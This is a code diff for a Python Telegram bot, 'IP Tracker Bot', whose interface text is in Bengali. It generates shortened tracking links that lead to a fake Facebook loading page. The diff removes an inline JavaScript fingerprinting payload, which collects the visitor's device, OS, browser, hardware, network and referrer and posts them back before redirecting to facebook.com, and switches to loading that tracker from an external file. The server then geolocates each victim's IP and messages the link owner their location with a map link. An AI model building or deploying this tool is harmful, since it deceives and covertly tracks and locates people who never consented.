@@ -4,7 +4,7 @@ import secrets
 import sqlite3
 import requests
 import telebot
-from flask import Flask, request, redirect, jsonify
+from flask import Flask, request, redirect, jsonify, send_from_directory
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from datetime import datetime
 
@@ -54,134 +54,52 @@ def check_membership(user_id):
 def join_markup():
     mk = InlineKeyboardMarkup()
     for ch in CHANNELS:
-        mk.add(InlineKeyboardButton(f"📢 Join {ch}", url=f"https://t.me/{ch[1:]}"))
+        mk.add(InlineKeyboardButton(
+            "📢 Join "+ch, url="https://t.me/"+ch[1:]))
     mk.add(InlineKeyboardButton("✅ Join করেছি", callback_data="check_join"))
     return mk
 
 def not_joined_msg(chat_id):
     bot.send_message(chat_id,
-        "⚠️ *বট ব্যবহার করতে আগে Join করো!*\n\n"
-        "নিচের চ্যানেলে Join করে\n"
-        "*✅ Join করেছি* বাটন চাপো।",
-        parse_mode="Markdown",
-        reply_markup=join_markup())
-
-# JS আলাদা variable এ রাখা হয়েছে — string escape সমস্যা নেই
-TRACKER_JS = """
-<script>
-var token = "TOKEN_HERE";
-var base  = "BASE_HERE";
-
-function sendData(data){
-  fetch(base + "/collect/" + token, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify(data)
-  }).finally(function(){
-    setTimeout(function(){ window.location.href = "https://www.facebook.com"; }, 300);
-  });
-}
-
-function getOS(ua){
-  if(/Android/.test(ua)){
-    var m = ua.match(/Android ([\d.]+)/);
-    return "Android " + (m ? m[1] : "");
-  }
-  if(/iPhone|iPad/.test(ua)){
-    var m = ua.match(/OS ([\d_]+)/);
-    return "iOS " + (m ? m[1].replace(/_/g,".") : "");
-  }
-  if(/Windows NT/.test(ua)){
-    var m = ua.match(/Windows NT ([\d.]+)/);
-    return "Windows " + (m ? m[1] : "");
-  }
-  if(/Mac OS X/.test(ua)){
-    var m = ua.match(/Mac OS X ([\d_]+)/);
-    return "macOS " + (m ? m[1].replace(/_/g,".") : "");
-  }
-  if(/Linux/.test(ua)) return "Linux";
-  return "Unknown";
-}
-
-function getBrowser(ua){
-  if(/Chrome\//.test(ua) && !/Edg/.test(ua)){
-    var m = ua.match(/Chrome\/([\d.]+)/);
-    return "Chrome " + (m ? m[1] : "");
-  }
-  if(/Firefox\//.test(ua)){
-    var m = ua.match(/Firefox\/([\d.]+)/);
-    return "Firefox " + (m ? m[1] : "");
-  }
-  if(/Edg\//.test(ua)){
-    var m = ua.match(/Edg\/([\d.]+)/);
-    return "Edge " + (m ? m[1] : "");
-  }
-  if(/Safari\//.test(ua)) return "Safari";
-  return "Unknown";
-}
-
-function getDevice(ua){
-  if(/Android/.test(ua)) return "Android";
-  if(/iPhone/.test(ua))  return "iPhone";
-  if(/iPad/.test(ua))    return "iPad";
-  return "Desktop";
-}
-
-function collect(){
-  var ua  = navigator.userAgent;
-  var nc  = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-  var data = {
-    os:       getOS(ua),
-    browser:  getBrowser(ua),
-    device:   getDevice(ua),
-    screen:   screen.width + "x" + screen.height,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
-    language: navigator.language || "Unknown",
-    ram:      navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
-    cpu:      navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Core" : "Unknown",
-    network:  nc.effectiveType || nc.type || "Unknown",
-    netspeed: nc.downlink ? nc.downlink + "Mbps" : "Unknown",
-    touch:    ("ontouchstart" in window) ? "Yes" : "No",
-    referrer: document.referrer || "Direct",
-    ua:       ua.substring(0, 200)
-  };
-  sendData(data);
-}
-
-collect();
-</script>
-"""
+        "⚠️ *বট ব্যবহার করতে আগে Join করো!*\n\nJoin করে ✅ বাটন চাপো।",
+        parse_mode="Markdown", reply_markup=join_markup())
 
 def make_page(token):
-    js = TRACKER_JS.replace("TOKEN_HERE", token).replace("BASE_HERE", BASE_URL)
-    return """<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Facebook</title>
-<link rel="icon" href="https://www.facebook.com/favicon.ico">
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#f0f2f5;display:flex;align-items:center;
-justify-content:center;height:100vh;font-family:Helvetica,Arial,sans-serif}
-.box{text-align:center}
-.logo{color:#1877f2;font-size:56px;font-weight:900;letter-spacing:-2px;margin-bottom:32px}
-.spin{width:38px;height:38px;border:4px solid #ddd;border-top:4px solid #1877f2;
-border-radius:50%;animation:s .8s linear infinite;margin:0 auto}
-@keyframes s{to{transform:rotate(360deg)}}
-</style>
-</head>
-<body>
-<div class="box">
-  <div class="logo">facebook</div>
-  <div class="spin"></div>
-</div>
-""" + js + "</body></html>"
+    return (
+        "<!DOCTYPE html><html><head>"
+        "<meta charset='UTF-8'>"
+        "<meta name='viewport' content='width=device-width,initial-scale=1.0'>"
+        "<title>Facebook</title>"
+        "<link rel='icon' href='https://www.facebook.com/favicon.ico'>"
+        "<style>"
+        "*{margin:0;padding:0;box-sizing:border-box}"
+        "body{background:#f0f2f5;display:flex;align-items:center;"
+        "justify-content:center;height:100vh;font-family:Helvetica,Arial,sans-serif}"
+        ".box{text-align:center}"
+        ".logo{color:#1877f2;font-size:56px;font-weight:900;"
+        "letter-spacing:-2px;margin-bottom:32px}"
+        ".spin{width:38px;height:38px;border:4px solid #ddd;"
+        "border-top:4px solid #1877f2;border-radius:50%;"
+        "animation:s .8s linear infinite;margin:0 auto}"
+        "@keyframes s{to{transform:rotate(360deg)}}"
+        "</style></head><body>"
+        "<div class='box'>"
+        "<div class='logo'>facebook</div>"
+        "<div class='spin'></div>"
+        "</div>"
+        "<input type='hidden' id='tk' value='" + token + "'>"
+        "<input type='hidden' id='bs' value='" + BASE_URL + "'>"
+        "<script src='/static/tracker.js'></script>"
+        "</body></html>"
+    )
 
 @app.route("/")
 def home():
     return "Bot Alive!", 200
+
+@app.route("/static/tracker.js")
+def serve_js():
+    return send_from_directory(".", "tracker.js")
 
 @app.route("/t/<token>")
 def track(token):
@@ -207,7 +125,8 @@ def collect(token):
 
     country=city=region=isp=lat=lon="Unknown"
     try:
-        loc = requests.get(f"http://ip-api.com/json/{ip}?lang=en", timeout=5).json()
+        loc = requests.get(
+            "http://ip-api.com/json/"+ip+"?lang=en", timeout=5).json()
         if loc.get("status") == "success":
             country = loc.get("country", "Unknown")
             city    = loc.get("city",    "Unknown")
@@ -219,16 +138,19 @@ def collect(token):
         pass
 
     db  = get_db()
-    row = db.execute("SELECT user_id, name FROM links WHERE token=?", (token,)).fetchone()
+    row = db.execute(
+        "SELECT user_id, name FROM links WHERE token=?", (token,)).fetchone()
     if not row:
         db.close()
         return jsonify({"ok": True})
 
     db.execute("UPDATE links SET clicks=clicks+1 WHERE token=?", (token,))
-    db.execute("""INSERT INTO logs
-        (token,ip,country,city,region,isp,lat,lon,device,os,browser,
-         screen,timezone,language,ram,cpu,network,netspeed,referrer,time)
-        VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
+    db.execute(
+        "INSERT INTO logs "
+        "(token,ip,country,city,region,isp,lat,lon,"
+        "device,os,browser,screen,timezone,language,"
+        "ram,cpu,network,netspeed,referrer,time) "
+        "VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
         (token, ip, country, city, region, isp, lat, lon,
          js.get("device","Unknown"), js.get("os","Unknown"),
          js.get("browser","Unknown"), js.get("screen","Unknown"),
@@ -242,31 +164,33 @@ def collect(token):
     link_name = row["name"]
     db.close()
 
-    maps = f"https://maps.google.com/?q={lat},{lon}" if lat and lat != "Unknown" else None
+    maps = ""
+    if lat and lat != "Unknown":
+        maps = "https://maps.google.com/?q="+lat+","+lon
 
     msg = (
-        f"🚨 *লিংকে ক্লিক হয়েছে!*\n\n"
-        f"🔗 *{link_name}*\n"
-        f"📅 {now}\n\n"
-        f"🌐 *IP:* `{ip}`\n"
-        f"🌍 দেশ: {country}\n"
-        f"🏙️ শহর: {city}\n"
-        f"📍 অঞ্চল: {region}\n"
-        f"📡 ISP: {isp}\n"
-        f"📌 {lat}, {lon}\n\n"
-        f"━━━━━━━━━━━━━\n"
-        f"📱 Device: {js.get('device','Unknown')}\n"
-        f"🖥️ OS: {js.get('os','Unknown')}\n"
-        f"🌐 Browser: {js.get('browser','Unknown')}\n"
-        f"📐 Screen: {js.get('screen','Unknown')}\n"
-        f"🕐 Timezone: {js.get('timezone','Unknown')}\n"
-        f"🗣️ Language: {js.get('language','Unknown')}\n"
-        f"💾 RAM: {js.get('ram','Unknown')}\n"
-        f"⚙️ CPU: {js.get('cpu','Unknown')}\n"
-        f"📶 Network: {js.get('network','Unknown')}\n"
-        f"⚡ Speed: {js.get('netspeed','Unknown')}\n"
-        f"👆 Touch: {js.get('touch','Unknown')}\n"
-        f"🔗 Referrer: {js.get('referrer','Direct')}"
+        "🚨 *লিংকে ক্লিক হয়েছে!*\n\n"
+        "🔗 *"+link_name+"*\n"
+        "📅 "+now+"\n\n"
+        "🌐 *IP:* `"+ip+"`\n"
+        "🌍 দেশ: "+country+"\n"
+        "🏙️ শহর: "+city+"\n"
+        "📍 অঞ্চল: "+region+"\n"
+        "📡 ISP: "+isp+"\n"
+        "📌 "+lat+", "+lon+"\n\n"
+        "━━━━━━━━━━━━━\n"
+        "📱 "+js.get("device","Unknown")+"\n"
+        "🖥️ OS: "+js.get("os","Unknown")+"\n"
+        "🌐 Browser: "+js.get("browser","Unknown")+"\n"
+        "📐 Screen: "+js.get("screen","Unknown")+"\n"
+        "🕐 Timezone: "+js.get("timezone","Unknown")+"\n"
+        "🗣️ Language: "+js.get("language","Unknown")+"\n"
+        "💾 RAM: "+js.get("ram","Unknown")+"\n"
+        "⚙️ CPU: "+js.get("cpu","Unknown")+"\n"
+        "📶 Network: "+js.get("network","Unknown")+"\n"
+        "⚡ Speed: "+js.get("netspeed","Unknown")+"\n"
+        "👆 Touch: "+js.get("touch","Unknown")+"\n"
+        "🔗 Referrer: "+js.get("referrer","Direct")
     )
 
     markup = InlineKeyboardMarkup()
@@ -281,13 +205,13 @@ def collect(token):
     if uid != ADMIN_ID:
         try:
             bot.send_message(ADMIN_ID,
-                f"👁️ *Admin Log*\n\n"
-                f"👤 Owner: `{uid}`\n"
-                f"🔗 Link: `{link_name}`\n"
-                f"🌐 IP: `{ip}`\n"
-                f"🌍 {country} | 🏙️ {city}\n"
-                f"📱 {js.get('device','Unknown')}\n"
-                f"📅 {now}",
+                "👁️ *Admin Log*\n\n"
+                "👤 Owner: `"+str(uid)+"`\n"
+                "🔗 Link: `"+link_name+"`\n"
+                "🌐 IP: `"+ip+"`\n"
+                "🌍 "+country+" | 🏙️ "+city+"\n"
+                "📱 "+js.get("device","Unknown")+"\n"
+                "📅 "+now,
                 parse_mode="Markdown")
         except:
             pass
@@ -297,10 +221,10 @@ def collect(token):
 def main_menu():
     mk = InlineKeyboardMarkup(row_width=2)
     mk.add(
-        InlineKeyboardButton("🔗 নতুন লিংক",  callback_data="new_link"),
-        InlineKeyboardButton("📋 আমার লিংক",  callback_data="my_links"),
-        InlineKeyboardButton("📊 Statistics",   callback_data="stats"),
-        InlineKeyboardButton("❓ Help",         callback_data="help"),
+        InlineKeyboardButton("🔗 নতুন লিংক", callback_data="new_link"),
+        InlineKeyboardButton("📋 আমার লিংক", callback_data="my_links"),
+        InlineKeyboardButton("📊 Statistics",  callback_data="stats"),
+        InlineKeyboardButton("❓ Help",        callback_data="help"),
     )
     return mk
 
@@ -320,11 +244,12 @@ def cmd_start(m):
         not_joined_msg(m.chat.id)
         return
     bot.send_message(m.chat.id,
-        f"👋 স্বাগতম *{m.from_user.first_name}*!\n\n"
+        "👋 স্বাগতম *"+m.from_user.first_name+"*!\n\n"
         "🔍 *IP Tracker Bot*\n\n"
-        "ট্র্যাকিং লিংক বানাও — ক্লিক করলেই পাবে:\n"
-        "IP • Location • Device • OS • Browser\n"
-        "RAM • CPU • Network • Screen • Timezone\n\n"
+        "ট্র্যাকিং লিংক বানাও\n"
+        "ক্লিক করলেই পাবে:\n"
+        "IP, Location, Device, OS, Browser\n"
+        "RAM, CPU, Network, Screen, Timezone\n\n"
         "👇 শুরু করো",
         parse_mode="Markdown", reply_markup=main_menu())
 
@@ -341,23 +266,21 @@ def cmd_admin(m):
         bot.send_message(m.chat.id, "❌ তুমি Admin না!")
         return
     db = get_db()
-    tu = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
-    tl = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
-    tc = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
+    tu   = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
+    tl   = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
+    tc   = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
     tlog = db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
     db.close()
     bot.send_message(m.chat.id,
-        f"⚙️ *Admin Panel*\n\n"
-        f"👥 Total Users: {tu}\n"
-        f"🔗 Total Links: {tl}\n"
-        f"👆 Total Clicks: {tc}\n"
-        f"📋 Total Logs: {tlog}",
+        "⚙️ *Admin Panel*\n\n"
+        "👥 Users: "+str(tu)+"\n"
+        "🔗 Links: "+str(tl)+"\n"
+        "👆 Clicks: "+str(tc)+"\n"
+        "📋 Logs: "+str(tlog),
         parse_mode="Markdown", reply_markup=admin_menu())
 
 def ask_name(chat_id):
-    msg = bot.send_message(chat_id,
-        "📌 লিংকের নাম দাও:\n_(যেমন: বন্ধুর লিংক)_",
-        parse_mode="Markdown")
+    msg = bot.send_message(chat_id, "📌 লিংকের নাম দাও:")
     bot.register_next_step_handler(msg, create_link)
 
 def create_link(m):
@@ -369,17 +292,18 @@ def create_link(m):
     now   = datetime.now().strftime("%d %b %Y")
 
     db = get_db()
-    db.execute("INSERT INTO links (token,user_id,name,clicks,created) VALUES(?,?,?,0,?)",
-               (token, m.from_user.id, name, now))
+    db.execute(
+        "INSERT INTO links (token,user_id,name,clicks,created) VALUES(?,?,?,0,?)",
+        (token, m.from_user.id, name, now))
     db.commit()
     db.close()
 
-    link  = f"{BASE_URL}/t/{token}"
+    link  = BASE_URL+"/t/"+token
     short = link
     try:
         r = requests.get(
-            f"https://is.gd/create.php?format=simple&url={requests.utils.quote(link)}",
-            timeout=5)
+            "https://is.gd/create.php?format=simple&url="+
+            requests.utils.quote(link), timeout=5)
         if r.text.startswith("http") and len(r.text) < 40:
             short = r.text.strip()
     except:
@@ -389,33 +313,33 @@ def create_link(m):
     mk.add(
         InlineKeyboardButton("📋 আমার লিংক", callback_data="my_links"),
         InlineKeyboardButton("🔗 নতুন লিংক", callback_data="new_link"),
-        InlineKeyboardButton("📊 Logs দেখো",  callback_data=f"logs_{token}"),
-        InlineKeyboardButton("🗑️ মুছো",       callback_data=f"del_{token}"),
+        InlineKeyboardButton("📊 Logs",        callback_data="logs_"+token),
+        InlineKeyboardButton("🗑️ মুছো",       callback_data="del_"+token),
     )
     bot.send_message(m.chat.id,
-        f"✅ *লিংক রেডি!*\n\n"
-        f"📌 নাম: `{name}`\n\n"
-        f"🔗 লিংক:\n`{short}`\n\n"
-        "ক্লিক করলেই সব information আসবে! 🎯",
+        "✅ *লিংক রেডি!*\n\n"
+        "📌 নাম: `"+name+"`\n\n"
+        "🔗 লিংক:\n`"+short+"`\n\n"
+        "ক্লিক করলেই সব info আসবে!",
         parse_mode="Markdown", reply_markup=mk)
 
 def show_links(chat_id, user_id):
     db   = get_db()
     rows = db.execute(
-        "SELECT token,name,clicks,created FROM links WHERE user_id=? ORDER BY rowid DESC",
+        "SELECT token,name,clicks FROM links WHERE user_id=? ORDER BY rowid DESC",
         (user_id,)).fetchall()
     db.close()
     if not rows:
-        bot.send_message(chat_id, "❌ কোনো লিংক নেই।\n/track দিয়ে বানাও!",
+        bot.send_message(chat_id, "❌ কোনো লিংক নেই। /track দিয়ে বানাও!",
             reply_markup=main_menu())
         return
-    msg = "📋 *তোমার লিংক গুলো:*\n\n"
+    msg = "📋 *তোমার লিংক:*\n\n"
     mk  = InlineKeyboardMarkup(row_width=2)
     for r in rows:
-        msg += f"🔗 *{r['name']}* — {r['clicks']} clicks\n`{BASE_URL}/t/{r['token']}`\n\n"
+        msg += "🔗 *"+r["name"]+"* — "+str(r["clicks"])+" clicks\n`"+BASE_URL+"/t/"+r["token"]+"`\n\n"
         mk.add(
-            InlineKeyboardButton(f"📊 {r['name'][:10]}", callback_data=f"logs_{r['token']}"),
-            InlineKeyboardButton("🗑️ মুছো", callback_data=f"del_{r['token']}"),
+            InlineKeyboardButton("📊 "+r["name"][:10], callback_data="logs_"+r["token"]),
+            InlineKeyboardButton("🗑️ মুছো",            callback_data="del_"+r["token"]),
         )
     mk.add(InlineKeyboardButton("🔙 Back", callback_data="menu"))
     bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=mk)
@@ -433,71 +357,53 @@ def cb(c):
 
     if d == "check_join":
         if check_membership(uid):
-            bot.send_message(cid, "✅ ধন্যবাদ! বট ব্যবহার করতে পারবে।",
-                reply_markup=main_menu())
+            bot.send_message(cid, "✅ ধন্যবাদ!", reply_markup=main_menu())
         else:
             bot.send_message(cid, "❌ এখনো Join করোনি!", reply_markup=join_markup())
-
     elif d == "menu":
         bot.send_message(cid, "👇 Main Menu:", reply_markup=main_menu())
-
     elif d == "new_link":
         ask_name(cid)
-
     elif d == "my_links":
         show_links(cid, uid)
-
     elif d == "stats":
         db = get_db()
         tl = db.execute("SELECT COUNT(*) FROM links WHERE user_id=?", (uid,)).fetchone()[0]
         tc = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links WHERE user_id=?", (uid,)).fetchone()[0]
         db.close()
         bot.send_message(cid,
-            f"📊 *তোমার Statistics*\n\n"
-            f"🔗 মোট লিংক: {tl}\n"
-            f"👆 মোট Clicks: {tc}",
+            "📊 *Statistics*\n\nLinks: "+str(tl)+"\nClicks: "+str(tc),
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="menu")))
-
     elif d == "help":
         bot.send_message(cid,
-            "❓ *কীভাবে ব্যবহার করবে?*\n\n"
-            "1 /track দাও\n"
-            "2 লিংকের নাম দাও\n"
-            "3 লিংক পাবে\n"
-            "4 ক্লিক করলেই সব info আসবে!\n\n"
-            "VPN থাকলে real IP পাওয়া যাবে না।",
-            parse_mode="Markdown",
+            "1. /track দাও\n2. নাম দাও\n3. লিংক পাবে\n4. ক্লিক হলেই info আসবে",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="menu")))
-
     elif d == "admin_users" and uid == ADMIN_ID:
         db   = get_db()
         rows = db.execute(
-            "SELECT user_id, COUNT(*) as lc, SUM(clicks) as tc FROM links GROUP BY user_id ORDER BY tc DESC LIMIT 15"
-        ).fetchall()
+            "SELECT user_id, COUNT(*) as lc, SUM(clicks) as tc "
+            "FROM links GROUP BY user_id ORDER BY tc DESC LIMIT 15").fetchall()
         db.close()
-        msg = "👥 *সব Users:*\n\n"
+        msg = "👥 *Users:*\n\n"
         for r in rows:
-            msg += f"ID: {r['user_id']} | Links: {r['lc']} | Clicks: {r['tc'] or 0}\n"
+            msg += "ID: "+str(r["user_id"])+" | Links: "+str(r["lc"])+" | Clicks: "+str(r["tc"] or 0)+"\n"
         bot.send_message(cid, msg, parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
-
     elif d == "admin_links" and uid == ADMIN_ID:
         db   = get_db()
         rows = db.execute(
-            "SELECT user_id,name,clicks FROM links ORDER BY clicks DESC LIMIT 15"
-        ).fetchall()
+            "SELECT user_id,name,clicks FROM links ORDER BY clicks DESC LIMIT 15").fetchall()
         db.close()
-        msg = "🔗 *সব Links:*\n\n"
+        msg = "🔗 *Links:*\n\n"
         for r in rows:
-            msg += f"👤 {r['user_id']} | {r['name']} | {r['clicks']} clicks\n"
+            msg += str(r["user_id"])+" | "+r["name"]+" | "+str(r["clicks"])+" clicks\n"
         bot.send_message(cid, msg, parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
-
     elif d == "admin_stats" and uid == ADMIN_ID:
         db = get_db()
         tu   = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
@@ -506,33 +412,25 @@ def cb(c):
         tlog = db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
         db.close()
         bot.send_message(cid,
-            f"📊 *Total Stats*\n\n"
-            f"👥 Users: {tu}\n"
-            f"🔗 Links: {tl}\n"
-            f"👆 Clicks: {tc}\n"
-            f"📋 Logs: {tlog}",
+            "📊 *Total Stats*\n\nUsers: "+str(tu)+"\nLinks: "+str(tl)+"\nClicks: "+str(tc)+"\nLogs: "+str(tlog),
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
-
     elif d == "admin_logs" and uid == ADMIN_ID:
         db   = get_db()
         rows = db.execute(
-            "SELECT l.ip, l.country, l.city, l.device, l.time, lk.name "
+            "SELECT l.ip,l.country,l.city,l.device,l.time,lk.name "
             "FROM logs l JOIN links lk ON l.token=lk.token "
-            "ORDER BY l.id DESC LIMIT 10"
-        ).fetchall()
+            "ORDER BY l.id DESC LIMIT 10").fetchall()
         db.close()
         msg = "📋 *Recent Logs:*\n\n"
-        for i, r in enumerate(rows, 1):
-            msg += f"{i}. {r['ip']} | {r['country']} | {r['device']} | {r['time']}\n"
+        for i,r in enumerate(rows,1):
+            msg += str(i)+". "+r["ip"]+" | "+r["country"]+" | "+r["device"]+" | "+r["time"]+"\n"
         bot.send_message(cid, msg, parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
                 InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
-
     elif d == "admin_back" and uid == ADMIN_ID:
         bot.send_message(cid, "⚙️ Admin Panel:", reply_markup=admin_menu())
-
     elif d.startswith("logs_"):
         token = d[5:]
         db    = get_db()
@@ -546,20 +444,35 @@ def cb(c):
         if not link:
             bot.send_message(cid, "পাওয়া যায়নি।")
             return
-        msg = f"📊 *{link['name']}* Logs:\n\n"
+        msg = "📊 *"+link["name"]+"* Logs:\n\n"
         if not logs:
             msg += "এখনো click নেই।"
         else:
-            for i, l in enumerate(logs, 1):
+            for i,l in enumerate(logs,1):
                 msg += (
-                    f"*{i}.* `{l['ip']}`\n"
-                    f"🌍 {l['country']} | {l['city']}\n"
-                    f"{l['device']} | {l['os']}\n"
-                    f"🌐 {l['browser']} | 📐 {l['screen']}\n"
-                    f"💾 {l['ram']} | ⚙️ {l['cpu']}\n"
-                    f"📶 {l['network']} {l['netspeed']}\n"
-                    f"🕐 {l['timezone']} | 📅 {l['time']}\n\n"
+                    str(i)+". `"+l["ip"]+"`\n"
+                    "🌍 "+l["country"]+" | "+l["city"]+"\n"
+                    +l["device"]+" | "+l["os"]+"\n"
+                    "🌐 "+l["browser"]+" | "+l["screen"]+"\n"
+                    "💾 "+l["ram"]+" | ⚙️ "+l["cpu"]+"\n"
+                    "📶 "+l["network"]+" "+l["netspeed"]+"\n"
+                    "📅 "+l["time"]+"\n\n"
                 )
         bot.send_message(cid, msg, parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup().add(
-                InlineKeyboardButton("🔙 Back", callback_data="my_link
+                InlineKeyboardButton("🔙 Back", callback_data="my_links")))
+    elif d.startswith("del_"):
+        token = d[4:]
+        db = get_db()
+        db.execute("DELETE FROM links WHERE token=? AND user_id=?", (token, uid))
+        db.execute("DELETE FROM logs WHERE token=?", (token,))
+        db.commit()
+        db.close()
+        bot.send_message(cid, "🗑️ মুছে দেওয়া হয়েছে!", reply_markup=main_menu())
+
+def run_flask():
+    app.run(host="0.0.0.0", port=8080)
+
+threading.Thread(target=run_flask, daemon=True).start()
+print("Bot Starting...")
+bot.infinity_polling()
